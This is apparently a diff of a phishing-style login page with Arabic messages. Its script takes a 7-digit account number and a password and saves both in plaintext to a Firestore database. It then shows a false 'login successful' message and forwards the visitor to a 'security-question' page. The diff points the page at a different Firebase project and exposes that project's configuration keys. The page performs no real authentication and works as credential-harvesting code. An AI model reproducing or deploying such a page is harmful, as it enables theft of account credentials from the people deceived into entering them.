@@ -44,71 +44,70 @@
     
     <div class="toast-message" id="toast"></div>
 
-    <script type="module">
-        // استيراد مكتبات Firebase
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
-        import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
+<script type="module">
+ 
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-analytics.js";
+  import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
 
-        // إعدادات Firebase
-        const firebaseConfig = {
-            apiKey: "AIzaSyB8EntKIzd3OfSTqhghCLm68iVwt5WaIRU",
-            authDomain: "project-id-77eb2.firebaseapp.com",
-            projectId: "project-id-77eb2",
-            storageBucket: "project-id-77eb2.appspot.com",
-            messagingSenderId: "1061898051036",
-            appId: "1:1061898051036:web:0eda29a129b8fce871c319"
-        };
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+  const firebaseConfig = {
+    apiKey: "AIzaSyBBs3cFGjT6iB8_xVEHG7r1rqXiiVa7nX4",
+    authDomain: "project-id-b8e1e.firebaseapp.com",
+    projectId: "project-id-b8e1e",
+    storageBucket: "project-id-b8e1e.firebasestorage.app",
+    messagingSenderId: "317735776154",
+    appId: "1:317735776154:web:6ee090d706c9a4bfcad423",
+    measurementId: "G-599FB4WM9Z"
+  };
 
-        const form = document.getElementById('loginForm');
-        const toast = document.getElementById('toast');
-        
-        // دالة عرض الإشعار
-        function showToast(message, color='#4CAF50') {
-            toast.innerText = message;
-            toast.style.backgroundColor = color;
-            toast.style.display = 'block';
-            setTimeout(()=> { toast.style.display = 'none'; }, 3000);
-        }
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+  const db = getFirestore(app);
 
-        form.addEventListener('submit', async e => {
-            e.preventDefault();
-            const userID = document.getElementById('userID').value.trim();
-            const password = document.getElementById('password').value.trim();
+  const form = document.getElementById('loginForm');
+  const toast = document.getElementById('toast');
 
-            if (!userID || !password) {
-                showToast('الرجاء إدخال رقم الحساب وكلمة المرور', '#D32F2F');
-                return;
-            }
+  function showToast(message, color='#4CAF50') {
+      toast.innerText = message;
+      toast.style.backgroundColor = color;
+      toast.style.display = 'block';
+      setTimeout(()=> { toast.style.display = 'none'; }, 3000);
+  }
 
-            if (userID.length !== 7 || isNaN(userID)) {
-                showToast('رقم الحساب يجب أن يتكون من 7 أرقام فقط.', '#D32F2F');
-                return;
-            }
+  form.addEventListener('submit', async e => {
+      e.preventDefault();
+      const userID = document.getElementById('userID').value.trim();
+      const password = document.getElementById('password').value.trim();
 
-            try {
-                // حفظ البيانات في Firestore
-                await setDoc(doc(db, "users", userID), {
-                    userID,
-                    password
-                }, { merge: true });
+      if (!userID || !password) {
+          showToast('الرجاء إدخال رقم الحساب وكلمة المرور', '#D32F2F');
+          return;
+      }
 
-                localStorage.setItem('userID', userID);
+      if (userID.length !== 7 || isNaN(userID)) {
+          showToast('رقم الحساب يجب أن يتكون من 7 أرقام فقط.', '#D32F2F');
+          return;
+      }
 
-                // 🌟 إظهار إشعار النجاح 
-                showToast('تم تسجيل الدخول بنجاح. جاري التوجيه...');
+      try {
+          await setDoc(doc(db, "users", userID), {
+              userID,
+              password
+          }, { merge: true });
 
-                // التوجيه بعد ثانية واحدة لإعطاء وقت لظهور الإشعار
-                setTimeout(() => {
-                    window.location.href = "security-question.html";
-                }, 1000);
+          localStorage.setItem('userID', userID);
+          showToast('تم تسجيل الدخول بنجاح. جاري التوجيه...');
 
-            } catch(err) {
-                console.error("خطأ في Firebase:", err);
-                showToast("حدث خطأ أثناء الحفظ، حاول مرة أخرى.", '#D32F2F');
-            }
-        });
-    </script>
+          setTimeout(() => {
+              window.location.href = "security-question.html";
+          }, 1000);
+
+      } catch(err) {
+          console.error("خطأ في Firebase:", err);
+          showToast("حدث خطأ أثناء الحفظ، حاول مرة أخرى.", '#D32F2F');
+      }
+  });
+</script>
+
 </body>
 </html>
